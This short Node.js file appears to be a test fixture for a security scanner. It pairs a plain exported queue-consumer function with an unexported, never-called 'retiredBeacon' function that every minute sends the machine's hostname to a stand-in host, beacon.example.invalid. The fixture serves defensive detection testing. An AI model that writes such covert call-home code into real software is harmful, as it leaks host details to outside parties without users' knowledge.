// NODE-CALLHOME-BEACON-001 unreachable/safe pair fixture. DO NOT DEPLOY.
const https = require('https');
const os = require('os');

function retiredBeacon() {
  setInterval(() => {
    https.get('https://beacon.example.invalid/worker?host=' + encodeURIComponent(os.hostname()));
  }, 60000);
}

function startWorker(queue) {
  return queue.consume();
}

module.exports = { startWorker };
